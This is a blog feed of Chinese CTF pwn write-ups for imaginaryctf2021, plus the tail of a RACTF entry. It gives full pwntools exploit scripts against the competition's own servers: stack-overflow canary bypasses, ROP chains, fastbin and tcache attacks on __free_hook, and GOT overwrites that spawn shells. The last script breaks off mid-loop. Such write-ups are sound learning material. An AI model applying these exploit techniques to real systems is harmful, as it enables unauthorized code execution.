libc_start += (<span class="number">0x10</span> ** (<span class="number">2</span> * i)) * my_guess</span><br><span class="line">           <span class="comment"># print(hex(canary))</span></span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">            depth = <span class="number">0</span></span><br><span class="line">            addition = <span class="number">0</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            addition += <span class="number">-1</span> * (<span class="number">0x100</span> // (<span class="number">2</span> ** (depth + <span class="number">1</span>)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        libc_start += (<span class="number">0x10</span> ** ( <span class="number">2</span> * i)) * my_guess</span><br><span class="line">        <span class="comment">#print(hex(canary))</span></span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">        depth = <span class="number">0</span></span><br><span class="line">        addition = <span class="number">0</span></span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">        print(<span class="string">'one true'</span>)</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">6</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">print(hex(libc_start))</span><br><span class="line">libc_start_main=libc_start<span class="number">-234</span></span><br><span class="line">log.info(<span class="string">'libc_start_main:'</span>+str(libc_start_main))</span><br><span class="line">print(count)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>-count):</span><br><span class="line">    target.sendline(str(i))</span><br><span class="line">    target.recvuntil(<span class="string">'Enter your guess:'</span>)</span><br><span class="line">    target.sendline(str(x[i]))</span><br><span class="line"><span class="comment">#gdb.attach(target)</span></span><br><span class="line"></span><br><span class="line">x=finder(<span class="string">'__libc_start_main'</span>,libc_start_main)</span><br><span class="line"></span><br><span class="line">target.sendline(<span class="string">'x'</span>*<span class="number">0x18</span>+p64(canary)+p64(<span class="number">0</span>)+p64(x.ogg(<span class="number">1</span>)))</span><br><span class="line">target.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;周末小打了下ractf,get 到了一些 小姿势,于是小记下避免搞忘了。</summary>
    
    
    
    <category term="CTF" scheme="lexsd6.github.io/categories/CTF/"/>
    
    
    <category term="wp" scheme="lexsd6.github.io/tags/wp/"/>
    
    <category term="pwn" scheme="lexsd6.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>imaginaryctf2021-pwn-wp</title>
    <link href="lexsd6.github.io/2021/07/28/imaginaryctf2021--pwn-wp/"/>
    <id>lexsd6.github.io/2021/07/28/imaginaryctf2021--pwn-wp/</id>
    <published>2021-07-28T15:40:37.640Z</published>
    <updated>2021-07-28T16:28:20.330Z</updated>
    
    <content type="html"><![CDATA[<p>又一次感受到外国题那种雨露均沾的感觉，题目有简单，也有看不懂的（tcl）</p><a id="more"></a><h2 id="fake-canary"><a href="#fake-canary" class="headerlink" title="fake_canary"></a>fake_canary</h2><p>题目没有看canary，但自己写了类似canary的功能。通过栈溢出在类似canary填上伪造canary即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libcfind <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf=<span class="string">'./fake_canary'</span></span><br><span class="line">e=ELF(elf)</span><br><span class="line"><span class="comment">#p=process(elf)</span></span><br><span class="line">p=remote(<span class="string">'chal.imaginaryctf.org'</span>,<span class="number">42002</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">0x000000000040079c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040079e : pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x00000000004007a0 : pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x00000000004007a2 : pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040079b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040079f : pop rbp ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400608 : pop rbp ; ret</span></span><br><span class="line"><span class="string">0x00000000004007a3 : pop rdi ; ret</span></span><br><span class="line"><span class="string">0x00000000004007a1 : pop rsi ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000040079d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000400536 : ret</span></span><br><span class="line"><span class="string">0x0000000000400542 : ret 0x200a</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.sendline(<span class="string">'1'</span>*<span class="number">8</span>*<span class="number">5</span>+p64(<span class="number">0xDEADBEEF</span>)+p64(e.symbols[<span class="string">'win'</span>])+p64(<span class="number">0x00000000000400729</span>))</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="linonophobia"><a href="#linonophobia" class="headerlink" title="linonophobia"></a>linonophobia</h2><p>题目很有意思把printf函数地址偷偷换成puts地址。导致本菜鸡在那卡了半天。</p><p>但发现可以通过puts和栈溢出泄露出canary。</p><p>但发现str_bin_sh和onegatgad都打不通。分析elf发现<code>0x000000000601060</code>地址端有写入提示，在此写入后门。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from libcfind import *</span><br><span class="line"></span><br><span class="line">elf&#x3D;&#39;.&#x2F;linonophobia&#39;</span><br><span class="line">e&#x3D;ELF(elf)</span><br><span class="line">context(arch&#x3D;e.arch,log_level&#x3D;&#39;debug&#39;)</span><br><span class="line">p&#x3D;remote(&#39;chal.imaginaryctf.org&#39;,42006)</span><br><span class="line">#p&#x3D;process(elf)</span><br><span class="line">#</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(&#39;1&#39;*8*31+&#39;2&#39;*8+&#39;3&#39;*0x8)</span><br><span class="line">p.recvline()</span><br><span class="line">#print(x)</span><br><span class="line">x&#x3D;p.recvline()[:7]</span><br><span class="line">print(len(x))</span><br><span class="line">print(x)</span><br><span class="line">addr&#x3D;u64(x.rjust(8,&#39;\x00&#39;))</span><br><span class="line"></span><br><span class="line">log.info(hex(addr))</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">pay&#x3D;&#39;1&#39;*8*31+&#39;2&#39;*8+&#39;3&#39;*0x8+p64(addr)</span><br><span class="line">print(hex(len(pay)))</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">0x000000000040086c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x000000000040086e : pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400870 : pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400872 : pop r15 ; ret</span><br><span class="line">0x000000000040086b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x000000000040086f : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400638 : pop rbp ; ret</span><br><span class="line">0x0000000000400873 : pop rdi ; ret</span><br><span class="line">0x0000000000400871 : pop rsi ; pop r15 ; ret</span><br><span class="line">0x000000000040086d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400566 : ret</span><br><span class="line">0x0000000000400769 : ret 0x8948</span><br><span class="line">0x0000000000400763 : ret 0xb60f</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">rdi_ret&#x3D;(0x0000000000400873 )</span><br><span class="line"></span><br><span class="line">p.sendline(&#39;1&#39;*8*31+&#39;2&#39;*8+&#39;3&#39;*0x8+p64(addr)+p64(0)+p64(rdi_ret)+p64(e.got[&#39;read&#39;])+p64(e.sym[&#39;puts&#39;])+p64(e.sym[&#39;main&#39;]))</span><br><span class="line">puts_addr&#x3D;u64(p.recvline()[:-1].ljust(8,&#39;\x00&#39;))</span><br><span class="line">log.info(hex(puts_addr))</span><br><span class="line">x&#x3D;finder(&#39;read&#39;,puts_addr,num&#x3D;1)</span><br><span class="line">p.sendline(&#39;1&#39;*8*31+&#39;2&#39;*8+&#39;3&#39;*0x8+p64(addr)+p64(0)+&#39;\x00&#39;*0x30)</span><br><span class="line"># rbx rbp r12 r13 r14 r15 </span><br><span class="line">def csu(g1,g2,buf,rbx,rbp,r12,r13,r14,r15,lest_cell):</span><br><span class="line">    pay&#x3D;p64(g1)+p64(0)</span><br><span class="line">    pay&#x3D;pay+p64(rbx)+p64(rbp)</span><br><span class="line">    pay&#x3D;pay+p64(r12)+p64(r13)+p64(r14)+p64(r15)</span><br><span class="line">    pay&#x3D;pay+p64(g2)</span><br><span class="line">    pay&#x3D;pay+&#39;\00&#39;*0x38+p64(lest_cell)</span><br><span class="line"></span><br><span class="line">    return pay</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(&#39;1&#39;*8*31+&#39;2&#39;*8+&#39;3&#39;*0x8+p64(addr)+p64(0)+p64(rdi_ret)+p64(0x000000000601060)+p64(x.dump(&#39;gets&#39;))+p64(rdi_ret)+p64(0x000000000601060)+p64(x.dump(&#39;system&#39;))+p64(e.sym[&#39;main&#39;]))</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">p.sendline(&#39;1&#39;)</span><br><span class="line">p.sendline(&#39;&#x2F;bin&#x2F;bash\x00&#39;)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="memory-pile"><a href="#memory-pile" class="headerlink" title="memory_pile"></a>memory_pile</h2><p>常规2.27libc 的fast bin 二次释放题，劫持<code>__free_hook</code>写入system,来得到shall。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libcfind <span class="keyword">import</span> *</span><br><span class="line">elf=<span class="string">'./memory_pile'</span></span><br><span class="line"></span><br><span class="line">e=ELF(elf)</span><br><span class="line">p=remote(<span class="string">'chal.imaginaryctf.org'</span>,<span class="number">42007</span>)</span><br><span class="line"><span class="comment">#p=process(elf)</span></span><br><span class="line">p.recvuntil(<span class="string">"I'll even give you a present, if you manage to unwrap it...\n"</span>)</span><br><span class="line">printf_addr=int(p.recvline(),<span class="number">16</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(num)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'With great power comes great responsibility &gt;'</span>)</span><br><span class="line">    p.sendline(str(num))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(num)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'With great power comes great responsibility &gt;'</span>)</span><br><span class="line">    p.sendline(str(num))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(num,text)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'With great power comes great responsibility &gt;'</span>)</span><br><span class="line">    p.sendline(str(num))</span><br><span class="line">    p.recvuntil(<span class="string">'Let me have it, boss &gt;'</span>)</span><br><span class="line">    p.sendline(text)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">'printf:'</span>+hex(printf_addr))</span><br><span class="line">x=finder(<span class="string">'printf'</span>,printf_addr)</span><br><span class="line">edit(<span class="number">0</span>,p64(x.dump(<span class="string">'__free_hook'</span>)))</span><br><span class="line">add(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(x.dump(<span class="string">'system'</span>)))</span><br><span class="line">edit(<span class="number">2</span>,<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="stackoverflow"><a href="#stackoverflow" class="headerlink" title="stackoverflow"></a>stackoverflow</h2><p>rt，简单栈溢出。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">e=ELF(<span class="string">'./stackoverflow'</span>)</span><br><span class="line"><span class="comment">#p=process('./stackoverflow')</span></span><br><span class="line"><span class="comment">#db.attach(p)</span></span><br><span class="line">p=remote(<span class="string">'chal.imaginaryctf.org'</span>,<span class="number">42001</span>)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>*<span class="number">8</span>*<span class="number">5</span>+p64(<span class="number">0x69637466</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="the-first-fit"><a href="#the-first-fit" class="headerlink" title="the_first_fit"></a>the_first_fit</h2><p>简单的uaf利用。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> choice, choice2;</span><br><span class="line">  <span class="keyword">char</span> *a = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">  <span class="keyword">char</span> *b;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>,<span class="literal">NULL</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>,<span class="literal">NULL</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"a is at %p\n"</span>, a);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"b is at %p\n"</span>, b);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"1: Malloc\n2: Free\n3: Fill a\n4: System b\n&gt; "</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;choice);</span><br><span class="line">    <span class="keyword">switch</span>(choice) &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">              <span class="built_in">printf</span>(<span class="string">"What do I malloc?\n(1) a\n(2) b\n&gt;&gt; "</span>);</span><br><span class="line">              <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;choice2);</span><br><span class="line">              <span class="keyword">if</span> (choice2 == <span class="number">1</span>)</span><br><span class="line">                a = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">              <span class="keyword">else</span> <span class="keyword">if</span> (choice2 == <span class="number">2</span>)</span><br><span class="line">                b = <span class="built_in">malloc</span>(<span class="number">128</span>);</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">              <span class="built_in">printf</span>(<span class="string">"What do I free?\n(1) a\n(2) b\n&gt;&gt; "</span>);</span><br><span class="line">              <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;choice2);</span><br><span class="line">              <span class="keyword">if</span> (choice2 == <span class="number">1</span>)</span><br><span class="line">                <span class="built_in">free</span>(a);</span><br><span class="line">              <span class="keyword">else</span> <span class="keyword">if</span> (choice2 == <span class="number">2</span>)</span><br><span class="line">                <span class="built_in">free</span>(b);</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>: <span class="built_in">printf</span>(<span class="string">"&gt;&gt; "</span>); <span class="built_in">scanf</span>(<span class="string">"%8s"</span>, a); <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>: system((<span class="keyword">char</span>*)b); <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>: <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="string-editor-1"><a href="#string-editor-1" class="headerlink" title="string_editor_1"></a>string_editor_1</h2><p>有意识的一道题，一次只能写入一个字符。但是由于存在数组下标越界，修改管理tetach，range 0x30 tache大于7且第一个的值向<code>__free_hook</code>附近（free_hook-0x20）.利用tache 优先级高于tache的特性，申请到free_hook-0x20的空间，在<code>__free_hook</code>写入<code>system</code>的地址，在free_hook-0x20写入<code>/bin/sh</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libcfind <span class="keyword">import</span> *</span><br><span class="line">elf=<span class="string">'string_editor_1'</span></span><br><span class="line"></span><br><span class="line">e=ELF(elf)</span><br><span class="line">p=remote(<span class="string">'chal.imaginaryctf.org'</span>,<span class="number">42004</span>)</span><br><span class="line"><span class="comment">#process(elf)</span></span><br><span class="line">p.recvuntil(<span class="string">'But first, a word from our sponsors:'</span>)</span><br><span class="line">system_addr=int(p.recvline(),<span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">'system:'</span>+hex(system_addr))</span><br><span class="line">x=finder(<span class="string">'system'</span>,system_addr)</span><br><span class="line">free_hook=p64(x.dump(<span class="string">'__free_hook'</span>)<span class="number">-0x20</span>)</span><br><span class="line">p.sendline(str(<span class="number">-0x290</span>))</span><br><span class="line">p.sendline(<span class="string">'x'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(free_hook),<span class="number">-1</span>,<span class="number">-1</span>):</span><br><span class="line">    </span><br><span class="line">    p.sendline(str(<span class="number">-0x211</span>+i))</span><br><span class="line">    p.sendline(free_hook[i<span class="number">-1</span>])</span><br><span class="line">p.sendline(<span class="string">'15'</span>)</span><br><span class="line">p.sendline(p8(<span class="number">0</span>))</span><br><span class="line">p.sendline(<span class="string">'14'</span>)</span><br><span class="line">p.sendline(p8(<span class="number">0</span>))</span><br><span class="line">system_addrs=p64(system_addr)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(system_addrs),<span class="number">-1</span>,<span class="number">-1</span>):</span><br><span class="line">    </span><br><span class="line">    p.sendline(str(<span class="number">0x20</span>+i<span class="number">-1</span>))</span><br><span class="line">    p.sendline(system_addrs[i<span class="number">-1</span>])</span><br><span class="line">shall=<span class="string">'\x00/bin/sh\x00'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(shall),<span class="number">-1</span>,<span class="number">-1</span>):</span><br><span class="line">    p.sendline(str(-i+<span class="number">8</span>))</span><br><span class="line">    p.sendline(shall[-i])</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="string-editor-2"><a href="#string-editor-2" class="headerlink" title="string_editor_2"></a>string_editor_2</h3><p>由于只能下溢出（负数），但能修改got表。修改strpy.got为pintf.got.plt.来通过格式化字符串泄露libcbase。</p><p>这里本地打通了，远程一直没打通，赛后专门看来dalao wp发现方法对的，可能是kali的原因（orw）。</p><p>想了个傻雕方法用<code>add-sysmbols</code>来猜与真实libcbase的差值 。</p><p>然后在修改strpy.got为system的真实地址，得到shell。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libcfind <span class="keyword">import</span> *</span><br><span class="line">elf=<span class="string">'./string_editor_2'</span></span><br><span class="line"><span class="comment">#0x601080</span></span><br><span class="line">e=ELF(elf)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">print(<span class="string">'__libc_start_main-l:'</span>+hex(libc.sym[<span class="string">'__libc_start_main'</span>]))</span><br><span class="line">LIBC=ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line">print(<span class="string">'__libc_start_main-r:'</span>+hex(LIBC.sym[<span class="string">'__libc_start_main'</span>]))</span><br><span class="line">p=remote(<span class="string">'chal.imaginaryctf.org'</span>,<span class="number">42005</span>)</span><br><span class="line"><span class="comment">#p=process(elf)</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">shall='\x00/bin/sh\x00'</span></span><br><span class="line"><span class="string">for i in range(len(shall),-1,-1):</span></span><br><span class="line"><span class="string">    p.sendline(str(-i+8))</span></span><br><span class="line"><span class="string">    p.sendline(shall[-i])</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="comment">#864e50</span></span><br><span class="line">sys=p64(e.sym[<span class="string">'printf'</span>]).rjust(<span class="number">8</span>,<span class="string">'\x00'</span>)</span><br><span class="line">print(sys)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(sys),<span class="number">-1</span>,<span class="number">-1</span>):</span><br><span class="line">    p.sendline(str(<span class="number">-0x69</span>+i))</span><br><span class="line">    p.sendline(sys[i<span class="number">-1</span>])</span><br><span class="line">    p.recvuntil(<span class="string">'Done.'</span>)</span><br><span class="line">shall=<span class="string">'%13$p'</span></span><br><span class="line"><span class="comment">#shall='%16$p' #0x100000000</span></span><br><span class="line"><span class="comment">#shall='%13$p'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(shall),<span class="number">-1</span>,<span class="number">-1</span>):</span><br><span class="line">    p.sendline(str(-i+<span class="number">8</span>))</span><br><span class="line">    p.sendline(shall[-i])</span><br><span class="line">    p.recvuntil(<span class="string">'Done.'</span>)</span><br><span class="line">p.sendline(str(<span class="number">15</span>))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.recvuntil(<span class="string">'3. Exit\n'</span>)</span><br><span class="line">p.sendline(str(<span class="number">2</span>))</span><br><span class="line">p.recvuntil(<span class="string">'***'</span>)</span><br><span class="line"></span><br><span class="line">addr=int(p.recvuntil(<span class="string">'%'</span>)[:<span class="number">-1</span>],<span class="number">16</span>)<span class="number">-0x3f</span><span class="number">-0xb4</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">print(hex(addr-LIBC.sym[<span class="string">'__libc_start_main'</span>]))</span><br><span class="line"></span><br><span class="line">x=finder(<span class="string">'__libc_start_main'</span>,addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sys=p64(x.dump(<span class="string">'system'</span>)).rjust(<span class="number">8</span>,<span class="string">'\x00'</span>)</span><br><span class="line">print(sys)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(sys),<span class="number">-1</span>,<span class="number">-1</span>):</span><br><span class="line">    